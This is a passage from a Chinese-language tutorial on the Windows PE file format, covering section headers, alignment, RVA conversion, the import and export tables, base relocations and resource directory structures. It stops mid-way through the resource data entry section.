<h3 id="Name"><a href="#Name" class="headerlink" title="Name"></a><strong>Name</strong></h3><p><strong>区块名</strong>。这是一个由8位的ASCII 码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：.text），这个“.” 实际上是不是必须的。值得我们注意的是，如果区块名超过 8 个字节，则没有最后的终止标志“NULL” 字节。并且前边带有一个“$” 的区块名字会从连接器那里得到特殊的待遇，前边带有“$” 的相同名字的区块在载入时候将会被合并，在合并之后的区块中，他们是按照“$” 后边的字符的字母顺序进行合并的。<br>另外每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，他的存在仅仅是为了正规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data” 或者说将包含数据的区块命名为“.Code” 都是合法的。当我们要从PE 文件中读取需要的区块时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照IMAGE_OPTIONAL_HEADER32 结构中的数据目录字段结合进行定位。</p>
<h3 id="Virtual-Size"><a href="#Virtual-Size" class="headerlink" title="Virtual Size"></a><strong>Virtual Size</strong></h3><p><strong>该区块表对应的区块的大小</strong>，这是区块的数据在没有进行对齐处理前的实际大小。</p>
<h3 id="Virtual-Address"><a href="#Virtual-Address" class="headerlink" title="Virtual Address"></a><strong>Virtual Address</strong></h3><p><strong>该区块装载到内存中的RVA 地址</strong>。这个地址是按照内存页来对齐的，因此它的数值总是SectionAlignment 的值的整数倍。在Microsoft 工具中，第一个快的默认 RVA 总为1000h。在OBJ 中，该字段没有意义地，并被设为0。</p>
<h3 id="SizeOfRawData"><a href="#SizeOfRawData" class="headerlink" title="SizeOfRawData"></a><strong>SizeOfRawData</strong></h3><p><strong>该区块在磁盘中所占的大小</strong>。在可执行文件中，该字段是已经被FileAlignment 潜规则处理过的长度。</p>
<h3 id="PointerToRawData"><a href="#PointerToRawData" class="headerlink" title="PointerToRawData"></a><strong>PointerToRawData</strong></h3><p><strong>该区块在磁盘中的偏移。</strong>这个数值是从文件头开始算起的偏移量。</p>
<h3 id="PointerToRelocations"><a href="#PointerToRelocations" class="headerlink" title="PointerToRelocations"></a><strong>PointerToRelocations</strong></h3><p>在EXE文件中没有意义，<strong>在OBJ 文件中，表示本区块重定位信息的偏移值</strong>。（在OBJ 文件中如果不是零，它会指向一个IMAGE_RELOCATION 结构的数组）</p>
<h3 id="PointerToLinenumbers"><a href="#PointerToLinenumbers" class="headerlink" title="PointerToLinenumbers"></a><strong>PointerToLinenumbers</strong></h3><p><strong>行号表在文件中的偏移值</strong>，文件的调试信息。</p>
<h3 id="NumberOfRelocations"><a href="#NumberOfRelocations" class="headerlink" title="NumberOfRelocations"></a><strong>NumberOfRelocations</strong></h3><p>EXE文件中也没有意义，<strong>在OBJ 文件中，是本区块在重定位表中的重定位数目</strong>。</p>
<h3 id="NumberOfLinenumbers"><a href="#NumberOfLinenumbers" class="headerlink" title="NumberOfLinenumbers"></a><strong>NumberOfLinenumbers</strong></h3><p><strong>该区块在行号表中的行号数目</strong></p>
<h3 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a><strong>Characteristics</strong></h3><p><strong>该区块的属性</strong>。该字段是按位来指出区块的属性（如代码&#x2F;数据&#x2F;可读&#x2F;可写等）的标志。</p>
<table>
<thead>
<tr>
<th>预定义值</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>IMAGE_SCN_CNT_CODE</td>
<td>0x00000020</td>
<td>The section contains executable code.包含代码，常与 0x10000000一起设置。</td>
</tr>
<tr>
<td>IMAGE_SCN_CNT_INITIALIZED_DATA</td>
<td>0x00000040</td>
<td>The section contains initialized data.该区块包含已初始化的数据。</td>
</tr>
<tr>
<td>IMAGE_SCN_CNT_UNINITIALIZED_DATA</td>
<td>0x00000080</td>
<td>The section contains uninitialized data.该区块包含未初始化的数据。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_DISCARDABLE</td>
<td>0x02000000</td>
<td>The section can be discarded as needed.该区块可被丢弃，因为当它一旦被装入后，进程就不在需要它了，典型的如重定位区块。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_SHARED</td>
<td>0x10000000</td>
<td>The section can be shared in memory.该区块为共享区块。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_EXECUTE</td>
<td>0x20000000</td>
<td>The section can be executed as code.该区块可以执行。通常当0x00000020被设置时候，该标志也被设置。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_READ</td>
<td>0x40000000</td>
<td>The section can be read.该区块可读，可执行文件中的区块总是设置该标志。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_WRITE</td>
<td>0x80000000</td>
<td>The section can be written to.该区块可写。</td>
</tr>
</tbody></table>
<h1 id="区块描述、对齐值以及RVA"><a href="#区块描述、对齐值以及RVA" class="headerlink" title="区块描述、对齐值以及RVA"></a>区块描述、对齐值以及RVA</h1><h2 id="各种区块描述"><a href="#各种区块描述" class="headerlink" title="各种区块描述"></a>各种区块描述</h2><p>通常，区块中的数据在逻辑上是关联的。PE 文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫.rdata，表明他是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/0_1311142139c7FV.jpeg" alt="0_1311142139c7FV"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/0_13111421475d2m.jpeg" alt="0_13111421475d2m"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/0_1311142153U2OP.jpeg"></p>
<p>在Visual C++ 中，用#pragma 来声明，告诉编译器插入数据到一个区块内，格式如下: #pragma data_msg( “FC_data” ) 。以上语句告诉编译器将数据都放进一个叫“FC_data” 的区块内，而不是默认的.data 区块。区块一般是从OBJ 文件开始，被编译器放置的。链接器的工作就是合并左右OBJ 和库中需要的块，使其成为一个最终合适的区块。链接器会遵循一套相当完整的规则，它会判断哪些区块将被合并以及如何被合并。</p>
<p><strong>合并区块：</strong><br>链接器的一个有趣特征就是能够合并区 块。如果两个区块有相似、一致性的属性，那么它们在链接的时候能被合并成一个单一的区块。这取决于是否开启编译器的 &#x2F;merge 开关。事实上合并区块有一个好处就是可以节省磁盘的内存空间……注意：我们不应该将.rsrc、.reloc、.pdata 合并到一起。</p>
<h2 id="区块的对齐值"><a href="#区块的对齐值" class="headerlink" title="区块的对齐值"></a><strong>区块的对齐值</strong></h2><p>PE 文件头里边的FileAligment 定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h 来填充，这就是区块间的间隙。在PE文件中，一个典型的对齐值是200h。PE 文件头里边的SectionAligment 定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。一般在X86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64 上，是按8KB（2000h）来排列的。所以在X86 系统中，PE文件区块的内存对齐值一般等于 1000h，每个区块按1000h 的倍数在内存中存放。</p>
<h2 id="RVA-和文件偏移的转换"><a href="#RVA-和文件偏移的转换" class="headerlink" title="RVA 和文件偏移的转换"></a>RVA 和文件偏移的转换</h2><p>RVA 是相对虚拟地址（Relative Virtual Address）的缩写，RVA 是当PE 文件被装载到内存中后，某个数据位置相对于文件头的偏移量。将 RVA 的值加上文件被装载的基地址，就可以找到数据在内存中的实际地址。</p>
<p>步骤一：循环扫描区块表得出每个区块在内存中的起始 RVA（根据IMAGE_SECTION_HEADER 中的VirtualAddress 字段），并根据区块的大小（根据IMAGE_SECTION_HEADER 中的SizeOfRawData 字段）算出区块的结束 RVA（两者相加即可），最后<strong>判断目标 RVA 是否落在该区块内</strong>。</p>
<p>步骤二：通过步骤一定位了目标 RVA 处于具体的某个区块中后，那么用目标 RVA 减去该区块的起始 RVA ，这样就能<strong>得到目标 RVA 相对于起始地址的偏移量 RVA2</strong>。</p>
<p>步骤三：在区块表中获取该区块在文件中所处的偏移地址（根据IMAGE_SECTION_HEADER 中的PointerToRawData 字段）, 将这个偏移值加上步骤二得到的 RVA2 值，就得到了真正的文件偏移地址。</p>
<h1 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h1><p><strong>一个区块中的数据仅仅只是由于属性相同而放在一起，并不一定是同一种用途的内容。例如接着要讲的输入表、输出表等就有可能和只读常量一起被放在同一个区块中，因为他们的属性都是可读不可写的。</strong>由于不同用途的数据有可能被放入同一个区块中，因此仅仅依靠区块表是无法确定和定位的。可以用PE 文件头中 IMAGE_OPTIONAL_HEADER32 结构的数据目录表来指出他们的位置，我们可以由数据目录表来定位的数据包括输入表、输出表、资源、重定位表和TLS等15 种数据。</p>
<h2 id="输入函数"><a href="#输入函数" class="headerlink" title="输入函数"></a>输入函数</h2><p>输入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于相关的DLL 文件中，在调用者程序中只保留相关的函数信息（如函数名、DLL 文件名等）就可以。对于磁盘上的PE 文件来说，它无法得知这些输入函数在内存中的地址，只有当PE 文件被装入内存后，Windows 加载器才将相关DLL 装入，并将调用输入函数的指令和函数实际所处的地址联系起来。这就是“动态链接”的概念。动态链接是通过PE 文件中定义的“输入表”来完成的，输入表中保存的正是函数名和其驻留的DLL 名等。</p>
<h2 id="输入表结构"><a href="#输入表结构" class="headerlink" title="输入表结构"></a>输入表结构</h2><p>在 PE文件头的 IMAGE_OPTIONAL_HEADER 结构中的 DataDirectory(数据目录表) 的第二个成员就是指向输入表的。而输入表是以一个 IMAGE_IMPORT_DESCRIPTOR(简称IID) 的数组开始。每个被 PE文件链接进来的 DLL文件都分别对应一个 IID数组结构。在这个 IID数组中，并没有指出有多少个项(就是没有明确指明有多少个链接文件)，但它最后是以一个全为NULL(0) 的 IID 作为结束的标志。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD   Characteristics;      // 0 for terminating null import descriptor</span><br><span class="line">        DWORD   OriginalFirstThunk;  // 包含指向IMAGE_DATA（输入名称表）RVA 的结构数组</span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;           //当可执行文件不与被导入的DLL进行绑定时，此字段为0</span><br><span class="line">    DWORD   ForwarderChain;                 //第一个被转向的API索引</span><br><span class="line">    DWORD   Name;                           //指向被导入的DLL 名称</span><br><span class="line">    DWORD   FirstThunk;    //指向输入地址表（IAT）RVA，IAT是IMAGE_THUNK_DATA结构的数组</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line">typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<h3 id="OriginalFirstThunk"><a href="#OriginalFirstThunk" class="headerlink" title="OriginalFirstThunk"></a>OriginalFirstThunk</h3><p>它指向first thunk，IMAGE_THUNK_DATA，该 thunk 拥有 Hint 和 Function name 的地址。</p>
<h3 id="TimeDateStamp"><a href="#TimeDateStamp" class="headerlink" title="TimeDateStamp"></a>TimeDateStamp</h3><p>该字段可以忽略。如果那里有绑定的话它包含时间&#x2F;数据戳（time&#x2F;data stamp）。如果它是0，就没有绑定在被导入的DLL中发生。在最近，它被设置为0xFFFFFFFF以表示绑定发生。</p>
<h3 id="ForwarderChain"><a href="#ForwarderChain" class="headerlink" title="ForwarderChain"></a>ForwarderChain</h3><p>一般情况下我们也可以忽略该字段。在老版的绑定中，它引用API的第一个forwarder chain（传递器链表）。它可被设置为0xFFFFFFFF以代表没有forwarder。</p>
<h3 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h3><p>它表示DLL 名称的相对虚地址（译注：相对一个用null作为结束符的ASCII字符串的一个RVA，该字符串是该导入DLL文件的名称，如：KERNEL32.DLL）。</p>
<h3 id="FirstThunk"><a href="#FirstThunk" class="headerlink" title="FirstThunk"></a>FirstThunk</h3><p>它包含由IMAGE_THUNK_DATA定义的 first thunk数组的虚地址，通过loader用函数虚地址初始化thunk。在Orignal First Thunk缺席下，它指向first thunk：Hints和The Function names的thunks。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_THUNK_DATA32 &#123;</span><br><span class="line">     union &#123;</span><br><span class="line">           DWORD ForwarderString;          // 一个RVA地址，指向forwarder string</span><br><span class="line">           DWORD Function;                       // PDWORD，被导入的函数的入口地址</span><br><span class="line">           DWORD Ordinal;                         // 该函数的序数</span><br><span class="line">           DWORD AddressOfData;           // 一个RVA地址，指向IMAGE_IMPORT_BY_NAME</span><br><span class="line">      &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>

<p>由于是union结构，所以IMAGE_THUNK_DATA 事实上是一个双字大小。</p>
<p>当 IMAGE_THUNK_DATA 值的最高位为 1时，表示函数以序号方式输入，这时候低 31位被看作一个函数序号。<br>当 IMAGE_THUNK_DATA 值的最高位为 0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个 RVA，指向一个 IMAGE_IMPORT_BY_NAME 结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_BY_NAME &#123; </span><br><span class="line">    	WORD Hint; </span><br><span class="line">    	BYTE Name[1]; </span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<p>结构中的 Hint 字段也表示函数的序号，不过这个字段是可选的，有些编译器总是将它设置为 0，Name 字段定义了导入函数的名称字符串，这是一个以 0 为结尾的字符串。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/0_1311142536Nbvn.jpeg" alt="0_1311142536Nbvn"></p>
<h2 id="输入地址表"><a href="#输入地址表" class="headerlink" title="输入地址表"></a>输入地址表</h2><p>为什么由两个并行的指针数组同时指向 IMAGE_IMPORT_BY_NAME 结构呢？第一个数组（由 OriginalFirstThunk 所指向）是单独的一项，而且不能被改写，我们前边称为 INT。第二个数组（由 FirstThunk 所指向）事实上是由 PE 装载器重写的。PE 装载器首先搜索 OriginalFirstThunk ，找到之后加载程序迭代搜索数组中的每个指针，找到每个 IMAGE_IMPORT_BY_NAME 结构所指向的输入函数的地址，然后加载器用函数真正入口地址来替代由 FirstThunk 数组中的一个入口，因此我们称为输入地址表（IAT）。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/0_1311142561i5KN.jpeg" alt="0_1311142561i5KN"></p>
<h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h1><p>当PE 文件被执行的时候，Windows 加载器将文件装入内存并将导入表(Export Table) 登记的动态链接库(一般是DLL 格式)文件一并装入地址空间，再根据DLL 文件中的函数导出信息对被执行文件的IAT 进行修正。有一个重要的概念需要记住： 动态链接库是被映射到其他应用程序的地址空间中执行的，它和应用程序可以看成是“一体”的，动态链接库可以使用应用程序的资源，它所拥有的资源也可以被应用程序使用，它的任何操作都是代表应用程序进行的，当动态链接库进行打开文件、分配内存和创建窗口等操作后，这些文件、内存和窗口都是为应用程序所拥有的。导出表就是记载着动态链接库的一些导出信息。通过导出表，DLL 文件可以向系统提供导出函数的名称、序号和入口地址等信息，比便Windows 加载器通过这些信息来完成动态连接的整个过程。</p>
<h2 id="导出表结构"><a href="#导出表结构" class="headerlink" title="导出表结构"></a>导出表结构</h2><p>导出表（Export Table）中的主要成分是一个表格，内含函数名称、输出序数等。序数是指定DLL 中某个函数的16位数字，在所指向的DLL 文件中是独一无二的。在此我们不提倡仅仅通过序数来索引函数的方法，这样会给DLL 文件的维护带来问题。例如当DLL 文件一旦升级或修改就可能导致调用改DLL 的程序无法加载到需要的函数。数据目录表的第一个成员指向导出表，是一个IMAGE_EXPORT_DIRECTORY(以后简称IED)结构，IED 结构的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">	DWORD Characteristics;</span><br><span class="line">	DWORD TimeDateStamp;			//creation time date stamp</span><br><span class="line">	WORD MajorVersion;</span><br><span class="line">	WORD MinorVersion;</span><br><span class="line">	DWORD Name;						//address of library file name</span><br><span class="line">	DWORD Base;						//ordinal base</span><br><span class="line">	DWORD NumberOfFunctions;		//number of functions</span><br><span class="line">	DWORD NumberOfNames;			//number of names</span><br><span class="line">	DWORD AddressOfFunctions;		//address of function start address array</span><br><span class="line">	DWORD AddressOfNames;			//address of function name string array</span><br><span class="line">	DWORD AddressOfNameOrdinals;	//address of ordinal array</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>

<h3 id="Name-2"><a href="#Name-2" class="headerlink" title="Name"></a>Name</h3><p>一个RVA 值，指向一个定义了模块名称的字符串。如即使Kernel32.dll 文件被改名为”Ker.dll”，仍然可以从这个字符串中的值得知其在编译时的文件名是”Kernel32.dll”。</p>
<h3 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h3><p>文件中包含的导出函数的总数。</p>
<h3 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h3><p>被定义函数名称的导出函数的总数，显然只有这个数量的函数既可以用函数名方式导出。也可以用序号方式导出，剩下的NumberOfFunctions 减去NumberOfNames 数量的函数只能用序号方式导出。该字段的值只会小于或者等于 NumberOfFunctions 字段的值，如果这个值是0，表示所有的函数都是以序号方式导出的。</p>
<h3 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h3><p>一个RVA 值，指向包含全部导出函数入口地址的双字数组。数组中的每一项是一个RVA 值，数组的项数等于NumberOfFunctions 字段的值。</p>
<h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>导出函数序号的起始值，将AddressOfFunctions 字段指向的入口地址表的索引号加上这个起始值就是对应函数的导出序号。假如Base 字段的值为x，那么入口地址表指定的第1个导出函数的序号就是x；第2个导出函数的序号就是x＋1。总之，一个导出函数的导出序号等于Base 字段的值加上其在入口地址表中的位置索引值。</p>
<h3 id="AddressOfNames-和-AddressOfNameOrdinals"><a href="#AddressOfNames-和-AddressOfNameOrdinals" class="headerlink" title="AddressOfNames 和 AddressOfNameOrdinals"></a>AddressOfNames 和 AddressOfNameOrdinals</h3><p>均为RVA 值。前者指向函数名字符串地址表。这个地址表是一个双字数组，数组中的每一项指向一个函数名称字符串的RVA。数组的项数等于NumberOfNames 字段的值，所有有名称的导出函数的名称字符串都定义在这个表中；后者指向另一个word 类型的数组（注意不是双字数组）。数组项目与文件名地址表中的项目一一对应，项目值代表函数入口地址表的索引，这样函数名称与函数入口地址关联起来。（举个例子说，假如函数名称字符串地址表的第n 项指向一个字符串“MyFunction”，那么可以去查找 AddressOfNameOrdinals 指向的数组的第n 项，假如第n 项中存放的值是x，则表示AddressOfFunctions 字段描述的地址表中的第x 项函数入口地址对应的名称就是“MyFunction”。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/30160144-5a9c96cc28ab4d408bc754099792f3df.jpg" alt="img"></p>
<h2 id="从序号查找函数入口地址"><a href="#从序号查找函数入口地址" class="headerlink" title="从序号查找函数入口地址"></a>从序号查找函数入口地址</h2><ol>
<li><p>定位到PE 文件头。</p>
</li>
<li><p>从PE 文件头中的 IMAGE_OPTIONAL_HEADER32 结构中取出数据目录表，并从第一个数据目录中得到导出表的RVA。</p>
</li>
<li><p>从导出表的 Base 字段得到起始序号。</p>
</li>
<li><p>将需要查找的导出序号减去起始序号，得到函数在入口地址表中的索引。</p>
</li>
<li><p>检测索引值是否大于导出表的 NumberOfFunctions 字段的值，如果大于后者的话，说明输入的序号是无效的。</p>
</li>
<li><p>用这个索引值在 AddressOfFunctions 字段指向的导出函数入口地址表中取出相应的项目，这就是函数入口地址的RVA 值，当函数被装入内存的时候，这个RVA 值加上模块实际装入的基地址，就得到了函数真正的入口地址。</p>
<h2 id="从函数名称查找入口地址"><a href="#从函数名称查找入口地址" class="headerlink" title="从函数名称查找入口地址"></a>从函数名称查找入口地址</h2></li>
<li><p>最初的步骤是一样的，那就是首先得到导出表的地址。</p>
</li>
<li><p>从导出表的 NumberOfNames 字段得到已命名函数的总数，并以这个数字作为循环的次数来构造一个循环。</p>
</li>
<li><p>从 AddressOfNames 字段指向得到的函数名称地址表的第一项开始，在循环中将每一项定义的函数名与要查找的函数名相比较，如果没有任何一个函数名是符合的，表示文件中没有指定名称的函数。</p>
</li>
<li><p>如果某一项定义的函数名与要查找的函数名符合，那么记下这个函数名在字符串地址表中的索引值，然后在 AddressOfNamesOrdinals 指向的数组中以同样的索引值取出数组项的值，我们这里假设这个值是x。</p>
</li>
<li><p>最后，以 x 值作为索引值，在 AddressOfFunctions 字段指向的函数入口地址表中获取的 RVA 就是函数的入口地址。</p>
</li>
</ol>
<h1 id="基址重定位"><a href="#基址重定位" class="headerlink" title="基址重定位"></a>基址重定位</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>当向程序的虚拟内存加载PE文件时，文件会被加载到ImageBase所指向的地址。<br>对EXE文件来说，EXE文件会首先加载到内存，每个文件总是使用独立的虚拟地址空间，这就意味着EXE文件不用考虑基址重定位问题。</p>
<p>对于DLL文件来说，多个DLL文件使用调用其本身的EXE文件的地址空间，不能保证ImageBase所指向的地址没有被其他DLL文件占用，所以DLL文件当中必须包含重定位信息。</p>
<p>但凡涉及到直接寻址的指令都需要进行重定位处理！</p>
<h2 id="PE重定位的操作原理"><a href="#PE重定位的操作原理" class="headerlink" title="PE重定位的操作原理"></a>PE重定位的操作原理</h2><ul>
<li>在应用程序当中查找硬编码位置(利用基址重定位表)</li>
<li>读取之后减去ImageBase，也就是用VA-基址得到RVA。</li>
<li>加上实际加载地址得到真正的VA。</li>
</ul>
<h2 id="基址重定位表结构"><a href="#基址重定位表结构" class="headerlink" title="基址重定位表结构"></a>基址重定位表结构</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_BASE_RELOCATION</span><br><span class="line">&#123;</span><br><span class="line">    DWORD VirtualAddress;	//基准地址(Base Address)</span><br><span class="line">    DWORD SizeOfBlock;		//重定位块大小(一个IMAGE_BASE_RELOCATION结构的大小)</span><br><span class="line">    WORD TypeOffset[1];</span><br><span class="line">&#125;IMAGE_BASE_RELOCATION;</span><br><span class="line">typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION</span><br></pre></td></tr></table></figure>

<p>每个IMAGE_BASE_RELOCATION只负责4KB大小分页内的重定位信息。因此结构中的VirtualAddress总是0x1000的倍数。IMAGE_BASE_RELOCATION结构体的第一个成员就VirtualAddress是RVA的值。第二个成员SizeOfBlock就是表示重定位块的大小。TypeOffset 是一个数组，数组每项大小为两个字节（16位），它由高 4位和低 12位组成，高 4位代表重定位类型，低 12位是重定位地址，它与 VirtualAddress 相加即是指向PE 映像中需要修改的那个代码的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_REL_BASED_ABSOLUTE           (0) 使块按照32位对齐，位置为0。</span><br><span class="line">IMAGE_REL_BASED_HIGH                    (1) 高16位必须应用于偏移量所指高字16位。</span><br><span class="line">IMAGE_REL_BASED_LOW                    (2) 低16位必须应用于偏移量所指低字16位。</span><br><span class="line">IMAGE_REL_BASED_HIGHLOW            (3) 全部32位应用于所有32位。</span><br><span class="line">IMAGE_REL_BASED_HIGHADJ              (4) 需要32位，高16位位于偏移量，低16位位于下一个偏移量数组元素，组合为一个带符号数，加上32位的一个数，然后加上8000然后把高16位保存在偏移量的16位域内。</span><br><span class="line">IMAGE_REL_BASED_MIPS_JMPADDR   (5)  Unknown</span><br><span class="line">IMAGE_REL_BASED_SECTION              (6)  Unknown</span><br><span class="line">IMAGE_REL_BASED_REL32                  (7)  Unknown</span><br></pre></td></tr></table></figure>

<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p>我们知道，Windows 将程序的各种界面定义为资源，包括加速键（Accelerator）、位图（Bitmap）、光标（Cursor）、对话框（Dialog Box）、图标（Icon）、菜单（Menu）、串表（String Table）、工具栏（Toolbar）和版本信息（Version Information）等。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/format,webp.webp" alt="img"></p>
<p>我们知道我们的资源有很多种类型，每种类型的资源中可能存在多个资源项，这些资源项用不同的ID 或者名称来区分。因此，我们采取类似于磁盘目录结构的方式保存。</p>
<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>数据目录表中的 IMAGE_DIRECTORY_ENTRY_RESOURCE 条目（第三项）包含资源的 RVA 和大小。资源目录结构中的每一个节点都是由 IMAGE_RESOURCE_DIRECTORY 结构和紧跟其后的数个IMAGE_RESOURCE_DIRECTORY_ENTRY 结构组成的。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=.jpeg" alt="00054  小甲鱼PE详解之资源（PE详解11）_字符串_02"></p>
<p>接下来看看IMAGE_RESOURCE_DIRECTORY 这个结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_RESOURCE_DIRECTORY STRUCT</span><br><span class="line">&#123;</span><br><span class="line">	DWORD Characteristics;		//理论上为资源的属性，不过事实上总是0</span><br><span class="line">	DWORD TimeDateStamp;		//资源的产生时刻</span><br><span class="line">	WORD MajorVersion;			//理论上为资源的版本，不过事实上总是0</span><br><span class="line">	WORD MinorVersion;</span><br><span class="line">	WORD NumberOfNamedEntries;	//以名称（字符串）命名的入口数量</span><br><span class="line">	WORD NumberOfIdEntries;		//以ID（整型数字）命名的入口数量</span><br><span class="line">&#125;IMAGE_RESOURCE_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>NameberOfNamedEntries 和 NumberOfIdEntries，它们说明了本目录中目录项的数量。两者加起来就是本目录中的目录项总和。也就是后边跟着的IMAGE_RESOURCE_DIRECTORY_ENTRY 数目。</p>
<h2 id="资源目录入口结构"><a href="#资源目录入口结构" class="headerlink" title="资源目录入口结构"></a>资源目录入口结构</h2><p>IMAGE_RESOURCE_DIRECTORY_ENTRY 紧跟在资源目录结构后，此结构长度为 8 个字节，包含 2 个字段。该结构定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_RESOURCE_DIRECTORY_ENTRY STRUCT</span><br><span class="line">&#123;</span><br><span class="line">	DWORD Name;		//目录项的名称字符串指针或ID</span><br><span class="line">	DWORD OffsetToData;		//目录项指针</span><br><span class="line">&#125;IMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure>

<p>Name 字段定义的是目录项的名称或ID。当结构用于第一层目录时，定义的是资源类型；当结构定义于第二层目录时，定义的是资源的名称；当结构用于第三层目录时，定义的是代码页编号。注意：当最高位为 0 的时候，表示字段的值作为 ID 使用；而最高位为 1 的时候，字段的低位作为指针使用（资源名称字符串是使用 UNICODE编码），但是这个指针不是直接指向字符串哦，而是指向一个 IMAGE_RESOURCE_DIR_STRING_U 结构的。该结构定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_RESOURCE_DIR_STRING_U STRUCT</span><br><span class="line">&#123;</span><br><span class="line">DWORD Length; //字符串的长度</span><br><span class="line">DWORD NameString; //UNICODE字符串，由于字符串是不定长的。由Length 制定长度</span><br><span class="line">&#125;IMAGE_RESOURCE_DIR_STRING_U;</span><br></pre></td></tr></table></figure>

<p>OffsetOfData 字段是一个指针，当最高位为 1 时，低位数据指向下一层目录块的其实地址；当最高位为 0 时，指针指向 IMAGE_RESOURCE_DATA_ENTRY 结构。<strong>将 Name 和 OffsetToData 用做指针时需要注意，该指针是从资源区块开始的地方算起的偏移量（即根目录的起始位置的偏移量），不是RVA。</strong></p>
<p>最后，在上图中我们看到，在第一层的时候，IMAGE_RESOURCE_DIRECTORY_ENTRY 的Name 字段作为资源类型使用。具体类型匹配见下表：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/R-C.jpg" alt="R-C"></p>
<h2 id="资源数据入口"><a href="#资源数据入口" class="headerlink" title="资源数据入口"></a>资源数据入口</h2><p>经过三层 IAMGE_RESOURCE_DIRECTORY_ENTRY （一般是3层，第一层资源类型，第二层资源名，第三层是资源的 Language），第三层目录结构中的 OffsetOfData 指向 IMAGE_RESOURCE_DATA_ENTRY 结构。该结构描述了资源数据的位置和大小，定义如下：</p>
